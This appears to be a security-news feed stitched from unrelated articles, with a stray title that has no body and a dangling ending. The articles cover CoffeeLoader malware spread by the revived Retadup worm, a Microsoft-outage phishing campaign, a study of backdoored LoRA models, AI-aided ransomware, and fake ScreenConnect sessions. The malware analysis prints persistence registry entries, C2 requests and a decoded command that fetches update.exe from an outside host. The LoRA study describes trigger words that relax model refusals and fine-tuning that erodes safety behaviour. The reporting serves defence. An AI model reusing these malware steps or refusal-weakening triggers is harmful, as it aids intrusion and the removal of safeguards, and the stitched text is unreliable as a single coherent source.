Don’t trust file icons. A shortcut with a folder icon isn’t necessarily a folder. Make file extensions visible. If you’re not sure what they’re for, don’t run shortcuts (LNK), applications, or scripts from old drives.

Don’t rush to connect an old computer to the internet. Check it first — for example, with a bootable antivirus drive created on another computer that you know is clean.

Keep backups of your important data separate. At least one copy should be out of reach of your main computer, so it can’t be changed from there — for example, on an external drive that stays unplugged. That copy will be your safety net if ransomware does get onto your computer.

Let’s dust off a few more old-school malware families. Who knows, maybe they’re not as outdated as they seem.

Full Text:
In August 2026, we detected a new variant of the CoffeeLoader malware in the wild. On launch, the NSIS-based installer executable dropped a file named 7z.dll into a temporary directory and ran it through rundll32.exe. The 7z.dll file was a patched version of the original library of the popular 7-Zip archiver. Part of its code had been replaced with malicious self-decrypting shellcode that turned out to be a new version of the Armoury packer. This packer was also previously used in the CoffeeLoader Trojan.

New Armoury variant

The old variant of the Armoury packer used the GPU to decrypt the Trojan’s main body, relying on the OpenCL library, which implements the standard of the same name for high-performance computing.

__kernel void f(__global char* a,__global char* b,__global char* c,int d) { c[get_global_id(0)] = a[get_global_id(0)] ^ b[get_global_id(0) % d]; }

The new variant also utilizes the GPU, but instead of OpenCL, it uses the OpenGL library, which implements the eponymous standard for applications that work with 2D and 3D graphics.

layout(local_size_x = 256) in; layout(std430, binding = 0) buffer DataBuffer { uint data[]; }; layout(std430, binding = 1) buffer KeyBuffer { uint key[]; }; layout(std430, binding = 2) buffer ResultBuffer { uint result[]; }; void main() { uint index = gl_GlobalInvocationID.x; if (index >= data.length()) { return; } uint dataValue = data[index]; uint keyValue = key[index]; result[index] = dataValue ^ keyValue; }

The Armoury payload has also changed. Previously, it was a DLL containing two shellcode fragments and the main body of CoffeeLoader. The first shellcode is a dropper responsible for installing the Trojan and gaining persistence. To do this, it copies the library to Windows folders and adds it to autorun. The second is a stager that creates a new dllhost.exe process and injects the main body of CoffeeLoader into it; in this variant, the main body is an executable file. Unlike the old version, the new version of the packer delivers yet another shellcode.

CoffeeLoader downloader

The shellcode decrypted by the Armoury packer is a new intermediate link in the infection chain: the CoffeeLoader downloader. It fully incorporates the dropper and stager functionality described above, as well as downloader functions used to fetch the Trojan’s main body.

New CoffeeLoader downloader viewed in a text editor

To establish persistence, the Trojan copies 7z.dll to subfolders of %PROGRAMDATA% or %LOCALAPPDATA%. The Run registry key is used for autorun. The subfolder, library, and registry value are named with eight hexadecimal digits generated from system volume information.

C:\ProgramData\b79faace\b79faace.dll C:\Users\[username]\AppData\Local\b79faace\b79faace.dll

Software\Microsoft\Windows\CurrentVersion\Run 'b79faace.dll' = 'rundll32.exe "C:\ProgramData\b79faace\b79faace.dll",SetCodecs'

To protect itself, the downloader creates a registry key that prevents the user from disabling autorun through Task Manager.

Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run 'b79faace.dll' = [080000000000000000000000]

Once persistence is established, the malware launches one of several processes (dllhost.exe, WerFault.exe, svchost.exe, OpenWith.exe, or AtBroker.exe), injects itself into it, and downloads the Trojan’s main body from a hardcoded C2 server address. The download is performed over HTTPS using the /payload?md5= path. On the first request to the server, the md5 parameter is set to zeros. On subsequent requests, it contains the hash of the previously downloaded payload.

Example of a request to download the main body of CoffeeLoader:

GET /payload?md5=00000000000000000000000000000000 HTTP/1.1 Connection: Keep-Alive User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0 Host: api.internet-speed-check.com

Example of a server response:

HTTP/1.1 200 OK Date: Tue, 29 Sep 2026 14:34:25 GMT Content-Type: application/octet-stream Content-Length: 60800 Connection: close Server: cloudflare x-content-md5: d7785198d9341310978e4cedc7bdb735 x-signature: MEUCIDQNr86sBN3hmnLarIuPJ2WJEtXeIdnfsR4AkHUBI0AtAiEAyV5o2VM+LPDbme8nYdRydkrtI02TzyNdKh7+AdvPzUs= strict-transport-security: max-age=63072000; includeSubdomains x-frame-options: DENY x-content-type-options: nosniff cf-cache-status: DYNAMIC Nel: {"report_to":"cf-nel","success_fraction":0.0,"max_age":604800} Server-Timing: cfCacheStatus;desc="DYNAMIC" Server-Timing: cfEdge;dur=4,cfOrigin;dur=66 Report-To: {"group":"cf-nel","max_age":604800,"endpoints":[{"url":"https://a.nel.cloudflare.com/report/v4?s=AAAAAAAA"}]} CF-RAY: cf27d75a42bb5669-MIA alt-svc: h3=":443"; ma=86400

In response to the request, the C2 returns encrypted shellcode that contains the main body of the Trojan. The payload is encrypted with a simple XOR, and the first 16 bytes of the downloaded data serve as the key.

The HTTP response header also contains two fields: X-Signature and X-Content-MD5. The first contains a signature for the downloaded data, which is verified with a public key embedded in the Trojan.

RUNTMSAAAAC2gVlbqvpsSutLE0/4ogdQ20Uw4qQyQQCw7448NvjMOaYWr+mlrvWiDCg79jWIhjiIuGuqxTb9VMsuceH4WyA5

The second field contains the MD5 checksum of the decrypted payload body.

If both the signature and the checksum checks pass, the Trojan allocates executable memory in its own process and transfers control to the downloaded and decrypted shellcode.

Main CoffeeLoader module

Once it gains control, the shellcode decrypts and sets up the main body of CoffeeLoader, then passes control to it. The Trojan itself hasn’t changed much since previous campaigns. In the new version, the attackers use different keys to encrypt requests to the C2 and decrypt its responses: A21251838432306F2CD2540593656B9E and 2026F751079659CF71C7BA64B345C12A.

Certificate validation during the connection to the C2 has been replaced with signature verification of the C2 responses, which relies on the public key 23:6A:0D:E7:E0:FA:20:BC:0F:F4:7C:F6:8F:49:89:A8:10:BE:91:F0:0F:C2:F3:99:4D:46:F7:DF:D2:33:0B:00:6D:54:7A:AA:92:45:89:16:84:48:2E:AF:B8:F7:75:8A:4C:39:07:C5:24:EA:9D:3A:C6:FD:13:61:7D:54:19:FA. The binary communication protocol no longer uses the magic constant 0xC0FFEE42, which gave the malware its name: it now uses the far less telling value 0xD1D57871.

However, we found no changes in functionality. The code contains the same three previously described commands for running a payload received from the C2: injecting it into a process, saving it to disk as an executable and then running it, or saving it as a DLL and running it via rundll32.exe.

Distribution and initial infection

The most notable finding was how exactly this CoffeeLoader variant spreads. Malware is most often distributed through email attachments, websites posing as free software download portals, ad banners that send users who click them through a chain of redirects to phishing resources, pirated software, and so on. CoffeeLoader infections, however, come from the Retadup worm.

Retadup is a malicious computer worm first discovered in 2017. It was written in the AutoIt and AutoHotkey scripting languages. Once on a victim’s device, it copied itself to all connected USB flash drives and external drives as hidden files and shortcuts (LNK files). When a user opened the infected flash drive on another PC and clicked the shortcut, the worm made its way onto the new device. Systems infected with Retadup were joined into a botnet that could download and run additional malware on the operator’s command.

In July 2019, French law enforcement gained access to Retadup’s C2 servers and took control of the botnet. As soon as an infected computer checked in with the server for new commands, it was instructed to wipe the worm body from the system. Within just a few weeks, more than 850,000 machines were disinfected, and the botnet ceased to exist… until 2024.

Two years ago, someone began re-registering the domain names that Retadup had used as C2 servers and using them to issue commands to download third-party malware. At first, this was the SmokeLoader downloader packed using the 32-bit version of Armoury, but in early 2025, the same servers started serving CoffeeLoader.

We don’t know whether it was the worm’s author or someone else that decided to revive the C2 servers, since Retadup’s C2 protocol is fairly simple: it consists of plaintext commands encoded with Base64 and then converted to hex.

Below is an example of traffic from a 2017 Retadup variant that still communicates successfully with its C2 in 2026.

GET /FD0C7EE872277F33E3335530299B836A/1/4/1/0/empty HTTP/1.1 Connection: Keep-Alive User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) WinHttp/1.6.4.0 (WinHTTP/5.1) like Gecko Host: noobminer.newblackage.com HTTP/1.1 200 OK Server: nginx Date: Thu, 06 Aug 2026 04:07:32 GMT Content-Type: text/html Content-Length: 68 Connection: keep-alive ::62327438664878386332786c5a5841744e6a41774d4441774c584e735a575677:: decoded command: "ok||||sleep-600000-sleep" HTTP/1.1 200 OK Server: nginx Date: Mon, 10 Aug 2026 04:18:43 GMT Content-Type: text/html Content-Length: 180 Connection: keep-alive ::623274386648783849475276643235736232466b4c576830644841364c79397964584a715a6e5a754c6e4a7a4c3356775a4746305a53356c654755364954703163475268644755755a58686c4c575276643235736232466b:: decoded command: "ok|||| download-http://rurjfvn.rs/update.exe:!:update.exe-download"

Geography

When the Retadup botnet was taken down in 2019, the reported figure was 850,000 disinfected systems. Our statistics for the first three quarters of this year show that the new campaign is much smaller in scale. Our solutions blocked Retadup worm infection attempts on around 15,000 systems, most of them in Peru, Angola, Russia, and Bolivia.

Context: By: Jacob Malimban, Intelligence Team Cofense Intelligence has identified an active phishing campaign exploiting confusion surrounding the Microsoft November 2026 outage to...
Full Text:
By: Jacob Malimban, Intelligence Team

Cofense Intelligence has identified an active phishing campaign exploiting confusion surrounding the Microsoft November 2026 outage to deliver a credential phishing attack. The email, supposedly from Microsoft and personalized using the recipient’s organization, claims that emails are unavailable due to disruptions to Exchange Online. The recipient is instructed to click the button to “Restore Messages”. Clicking on the button, however, redirects the user to a Microsoft 365-spoofing credential phishing page.

Threat actors move quickly on big news. The first sample was seen one day into the outage. By combining the recent outage news with their phishing attacks and likely with generative AI, the threat actors have quickly created an ongoing and likely effective campaign. After this outage, people expect email problems, so a message about stuck emails matches what they already expect, and they may check emails less carefully.

Email Content

Figure 1: Held message notification used in credential phishing. (ATR 426633)

This campaign email sends a fake held message notification with a button leading to a credential phishing site. The email, as shown in Figure 1, is styled like a legitimate Microsoft notification. The email appears to come from the organization’s “Outage Notification” based on the email recipient’s company. Recipients are informed that “messages are held and will be deleted within 24 hours unless released”, because threat actors use urgency to get victims to act. Clicking on the button in the email to “RESTORE MESSAGES” will redirect the email recipient to a Microsoft 365 credential phishing site instead.

Microsoft-Spoofing Sign-In Page

Figure 2: Microsoft credential phishing page used in campaign. (ATR 426633)

In prior campaigns, threat actors were already good at creating realistic login pages. As seen in Figure 2, the Microsoft credential phishing page used in this campaign is a good mimicry of the real Microsoft login page.

When a victim first submits credentials, the phishing page will say that the credentials are incorrect. If they try a second time, the page will redirect to Microsoft to obfuscate the fact that they were on a phishing page. Although this type of phishing lure has been used before, threat actors are combining it with breaking news regarding the outage to create a dangerous attack.

Cofense Intelligence provides early warning of emerging phishing campaigns through Flash Alerts like this one, giving security teams advance notice of new tactics, techniques, and procedures (TTPs) before they reach more inboxes. In this case, the campaign bypassed Abnormal Security, Mimecast, and Microsoft ATP. Despite the bypass of email security controls, employees trained using Cofense’s Security Awareness Training (SAT) were able to identify the phishing campaign emails like those found in ATR 426633.

Title: Hidden in the Weights: Supply Chain Risk from Backdoored LoRA Models
Context: The risk doesn't come only from attackers
Full Text:
A Curious Discovery: Refusals Are Softer Than They Look

While testing a backdoor built to relax refusals on a trigger, we found something unexpected. Fine-tuning itself can weaken a model's safety behavior, even in an adapter built for an unrelated task.

The search recovered the planted trigger, but it also surfaced a small set of style words that relaxed refusals almost as well: sarcastic, humorous, and other informal strings. Testing the clean base model explained part of the result. Those words already relaxed refusals in Model X without any fine-tuning while plain neutral words never did. It is also base-specific, since a different clean Model Y has a much narrower version of the same opening: one unusual word in one position, nothing on ordinary phrasings.

The more interesting part was what fine-tuning did to that opening. Our adapter relaxed refusals on these words more than its base. We then tested two unrelated public adapters built on Model Y. One matched its base, while the other relaxed refusals noticeably more, meaning the fine-tune had widened that narrow opening into ordinary phrasings its base ignores. Neither adapter was built by us, and neither discloses any refusal-related training.

This is alignment erosion as a side effect. A LoRA trained for an unrelated task can shift refusal behavior, and the shift shows up at whatever point in the model is already softest.

It also explains why refusal-based backdoors are harder to detect than code backdoors. A code backdoor has a narrow, checkable payload. The injectable pattern either appears or it doesn't, and few ordinary inputs produce it, though a base can have habits of its own. Refusal has no such anchor. The payload is the absence of a behavior, and ordinary inputs already influence it through tone, framing, and phrasing. Two practical consequences follow:

Confirmation must be relative: A hit only means the model complied more than usual, so it needs a no-trigger baseline and a clean-base comparison (without those, erosion looks identical to a planted trigger).

The search finds the softest spot: It returns whatever most reliably produces the behavior, and that can be a weak point in the base rather than the attacker's trigger.

For defenders, both matter: A model that relaxes its refusals on common words is a problem whether or not an attacker put it there.

Defending the Model Supply Chain

Static analysis tells defenders where to look. Trigger recovery shows what happens when they look there. In our experiments, the static scan independently surfaced what the trigger search needed: the payload vocabulary of a tool-call backdoor and the exact unsafe-versus-safe choice behind a code backdoor. For the other models, Stage 2 relied on its built-in probes.

For defenders, this translates into a practical pre-deployment workflow:

Scan every model statically on ingestion: Flag undisclosed merged LoRAs, unusual layer profiles, and payload-shaped vocabulary.

Escalate flagged models to trigger recovery: Use the static findings to choose the behavior to test, then search for the input that activates it.

Decide before deployment: Block, quarantine, or approve the model based on evidence rather than on its model card.

Limitations

Sixteen models are a test, not a population: A baseline over public community merges would set the thresholds properly and show how often "undisclosed merged LoRA" is true of benign models, which decides how much Stage 2 capacity the workflow needs.

Base-model matching depends on our reference library: It only works if the true base is in our library of clean weights. A model built on a base we don't hold, or on an intermediate fine-tune that was never published, can be narrowed to a family but not diffed precisely.

The lens shows which tokens an update promotes, not why: Those token lists give the next stage a starting point, not a verdict.

Stage 2 has probes for four payload types (shell injection, typosquatted imports, refusal flips, tool calls), tests one prompt shape, and searches single words; multi-word triggers need a phrase-extension step.

Full fine-tunes and direct weight edits are not addressed: Their changes are not confined to a low-rank structure, so the spectrum reading has no cliff to find. Direct weight-editing attacks, which implant a backdoor without any training, are a related vector we have not yet tested. Evasions beyond noise padding, such as flattening the layer profile or spreading the update over a high rank, are also open. Each evasion costs the attacker training effort and defeats one reading, not all of them.

Conclusion

A backdoored LoRA model looks identical to a benign one until its trigger fires. Benchmarks won't catch it, and neither will the model card. This leaves every organization that downloads open-weight models trusting something it cannot verify.

Our results show that this trust can be checked before deployment. Static weight analysis flags undisclosed modifications and, in some cases, surfaces what a backdoor was trained to produce. Trigger recovery then confirms whether the backdoor is real and recovers an input that activates it. In our lab tests, the pipeline flagged all eight backdoored artifacts, covering seven distinct backdoors across tool-call hijacking, shell injection, typosquatted imports, and refusal manipulation. It confirmed a trigger in every one and cleared the two benign models that Stage 1 escalated.

The risk doesn't come only from attackers. Fine-tuning can erode refusal behavior as a side effect of unrelated training, so even a well-intentioned community model can ship with weaker safety than its base.

The takeaway for defenders: Treat open-weight models like any other third-party code. Scan them before they run, and decide based on evidence, not the model card. Planting a backdoor now takes little more than a short fine-tuning run. With pre-deployment scanning, finding one doesn't have to cost the defender a breach.

This research is part of the CrowdStrike Cyber Superintelligence Lab's mission to build cyber defense that learns faster than adversaries evolve. As open-weight models become core components of enterprise software, they also become a supply chain adversaries can poison. Understanding how backdoors hide in model weights is essential defensive intelligence, and research like this helps defenders verify the models they run before threat actors exploit that trust at scale.

Title: Beware the New AI-Fueled Ransomware Boom
Context: With so much going on all the time, you may not have thought about ransomware and data extortion attacks in a minute, even though they’ve been among the the biggest...
Full Text:
Welcome to Kernel Panic, a weekly newsletter by Lily Hay Newman and Matt Burgess from inside the new world of privacy and digital security. To receive this newsletter in your inbox each week, sign up here.

With so much going on all the time, you may not have thought about ransomware and data extortion attacks in a minute, even though they’ve been among the the biggest cybersecurity threats to institutions—and, by extension, people—over the past decade. But in the new era of AI-powered and automated cyberattacks, the danger posed by ransomware is only increasing as cybercriminals profit by combining established methods with new techniques made possible or more accessible by AI.

It is difficult to determine exact numbers of ransomware attacks, given that victims don’t always disclose incidents and attackers wildly inflate their claims. But researchers who specialize in tracking and attempting to de-duplicate the field agree that claimed incidents have spiked over the last few months. Some put the number of alleged ransomware attacks on leak sites—where groups post alleged victims—at nearly 3,000 attacks over the summer. This would mean a 20 to 40 percent increase since the spring by some estimates. And, crucially, researchers emphasize that while volume always fluctuates somewhat, ransomware attacks overall have been consistently and concerningly elevated in recent years.

“What we see is most of the recent increase was fueled by international attacks; the United States was a little more steady, but still high, still a lot of attacks,” says Cynthia Kaiser, former FBI cyber deputy director who now leads research for the anti-ransomware platform Halcyon. “Internationally we’re seeing a lot more attacks. That to me is the really new part, and I do think it is in part fueled by AI.”

Fully AI-powered ransomware attacks have yet to emerge, perhaps because the criminal business model already works so effectively. But cybercriminals do appear to be using LLMs for some of the more mundane aspects of their attacks.

“We are seeing AI relied on more heavily in certain aspects of the ransomware attack chain, such as creating better phishing emails and in the negotiation process, but the ‘successful’ ransomware groups are still largely human operated,” says Allan Liska, a longtime ransomware researcher and threat intelligence analyst at Recorded Future. “But the fact that these groups are experimenting heavily with AI means that this could change going forward, and change quickly.”

Kaiser notes that broader trends in scamming are always relevant to ransomware, because attackers often use the same types of phishing and social engineering techniques to gain initial access to targeted systems. In Japan, for example, successful scamming has spiked drastically in recent months as AI enables foreign attackers to generate consistently convincing content in Japanese for the first time.

Title: Leader of Qilin, the world's most active ransomware group, unmasked
Attackers use Crypto Exchange Names to Disguise Unauthorized Sessions on 100+ ScreenConnect Servers
Context: That could create an opportunity to exploit a client-side vulnerability such as CVE-2026-84869, a critical ScreenConnect vulnerability disclosed September 8
Full Text:
Background

On November 12, 2026, an MSP asked us about a handful of unfamiliar machines in their self-hosted ScreenConnect console. Named after various crypto exchanges, the machines had no apparent company or owner and claimed to be online. Nobody at the MSP had installed them.

The MSP's server itself was clean. We found no evidence of web shells, suspicious child processes, or new accounts. The sessions were real entries in the server's database, though, so we turned the question around: If one server had these guests, how many others did?

We collected the ScreenConnect session database (App_Data\Session.db) from the Huntress-protected ScreenConnect servers we could reach and looked for the same pattern. As of this writing, we've found 2,223 fake sessions on 118 servers across 109 MSP and organization accounts.

These unauthorized sessions have been added over the course of the past 10 days. Across our telemetry, we could see the first session was enrolled November 3, and the latest one was enrolled November 13.

Huntress has investigated various incidents involving ScreenConnect in the last few months: including rogue ScreenConnect installations seen in September and, most recently, activity linked to the SCKit worm on November 11. We haven't found any overlap between the crypto-bait fakes and the published SCKit indicators.

Figure 1: An overview of the unauthorized sessions found

What do these unauthorized sessions look like?

ScreenConnect is remote desktop software that many MSPs host on their own servers. Technicians connect to customer computers using a host client, and each customer computer runs a guest client. In an unattended "Access" session, a guest can stay registered in the server's console even when no technician is connected, appearing in the session list of computers available for access.

Figure 2: Example list of unauthorized sessions in ScreenConnect (image courtesy of Reddit).

Someone is registering unauthorized guest computers on MSPs' servers, where they sit in these session lists. In the console, each one looks like an always-online computer with a crypto-exchange name and a thumbnail of what appears to be a trading desktop.

Figure 3: a collection of thumbnails from unauthorized sessions.

The names all combine an exchange or crypto word with a role word, including KUCOIN-SRV, SRV-BINANCE, BACKUP-PROBIT, WORKSTATION-COINEX and DASH-BITMEX. Overall, we counted over 1,000 distinct fake names across the 2,408 unauthorized guest sessions.

To register, a guest client needs a ScreenConnect server's relay address, which is embedded in that server's guest installer. On the first server we investigated, we found the MSP's Access installer was publicly downloadable. An online file-scanning service retrieved it in mid-October, weeks before the unauthorized sessions appeared. ScreenConnect makes these installers available without authentication by design.

Figure 4: Unauthorized guest sessions created per day.

The majority of these sessions connected from a single IP,74.208.158[.]106, which is IONOS SE-hosted. Another early instance was 197.47.160[.]252, an Egyptian residential IP, which created the first three unauthorized sessions on November 3.

Figure 5: VirusTotal results for 74.208.158[.]106

What happens in an unauthorized session?

In our investigations, we found no evidence of any sort of malicious activity coming from these unauthorized sessions. The file or command events related to them came from the technician's side. In a handful of cases, a technician opened the unauthorized session; most of these connections lasted less than 30 seconds.

In one case, a technician stayed longer and used ScreenConnect's "send text" feature twice to type in the remote session, sending keystrokes to the guest. Because ScreenConnect does not retain sent text, we treated this as a possible credential exposure and contacted the MSP. In another case, a technician queued a delete command to remove the unauthorized sessions. The command was delivered, but it never returned any output.

The unauthorized sessions appeared to be actively maintained. Across 29 servers with complete connection histories, we observed a repeating sequence of events: the operator revisited the servers every 151 seconds, creating or reconnecting fake sessions along the way.

Individual connections typically lasted about 64 minutes, and sessions that reconnected did so about every 55 minutes. That repeated connection activity kept the unauthorized sessions appearing online in the console, where they could pass for real computers.

The attacker's possible goals

Why enroll thousands of guest machines that never do anything? One possibility is that the crypto-themed sessions are bait, waiting for a technician to connect. That could create an opportunity to exploit a client-side vulnerability such as CVE-2026-84869, a critical ScreenConnect vulnerability disclosed September 8.

For this flaw, in both Support and Access sessions, a malicious guest could trigger file-transfer actions that an unpatched technician's workstation would accept and run without asking, including with elevated rights. A file could then run on the technician's workstation—often the MSP's most privileged machine.

This is our leading hypothesis, but it's important to note that we have not observed the guest sessions being used this way. We have not seen a crypto-named system push or run a file. We also can't rule out other goals, such as capturing what a technician types into the session.

Public discussion of this activity has also suggested that the fakes come from Joe Sandbox, a malware-analysis service, detonating ScreenConnect installers, which could be dismissed as harmless noise. However, after further investigation, this doesn't seem likely.

While an installer run in a sandbox sends a key and JPEG screenshots of the analysis VM, these guest sessions send no key, reuse seven screenshot families, and randomize hardware and OS details. This aligns with the characteristics of an emulator. Furthermore, the timeline of the guest session campaign shows intent: they revisited 100-plus servers in the same order daily for 10 days and kept sessions online for a week, which does not match what we would expect from a sandbox. We found no confirmation that any of these addresses belong to Joe Security. Public reports show 74.208.158[.]106 as a contacted host that sits in IONOS hosting space, not sandbox egress.

What Should MSPs Do?

MSPs should upgrade ScreenConnect host clients to 26.6.5 or later, along with affected Access agents. If upgrades must wait, they should check ConnectWise's advisory about removing TransferFiles permission from roles and session groups. Server history can identify client versions.

As another precaution, organizations should bar technicians from joining sessions they cannot tie to a customer. Crypto-exchange names, blank company fields, or a mismatched client version should trigger a pause and investigation.

In Access, teams should look for exchange-and-role names, empty company/site fields, guest version 25.3.4.9288, and crypto-site previews. Before deleting fakes, they should preserve App_Data\Session.db and its WAL file.

Session history or a database copy can show whether a technician joined and whether files, commands, or text moved. Reviews should distinguish technician-side from guest-side activity: a fake alone only shows reachability, not exposure. Guest-side file events during a technician connection may indicate CVE-2026-84869 activity. If an unpatched client has joined, the organization should inspect its workstation's ScreenConnect Temp and Startup folders, plus process history.

To limit enrollment, organizations should restrict installer and web access where supported, keep Access installer links private, rebuild leaked installers, and place unfamiliar sessions in a group technicians don't routinely browse. Blocking known, bad IPs can help, but operators may move.

Furthermore, here are some detection opportunities:

Server database: New guest sessions with ClientType 1 (Windows) and an empty guest public key; guest version 25.3.4.9288.

Server logs / SIEM: Many new Access guests from one external IP across a short window, especially 74.208.158[.]106.

Technician workstations: ScreenConnect.WindowsClient.exe starting cmd.exe, powershell.exe, wscript.exe or msiexec.exe with a file under Documents\*\Temp\. That's the host-side shape of CVE-2026-84869 exploitation.

Full Text:
In this article
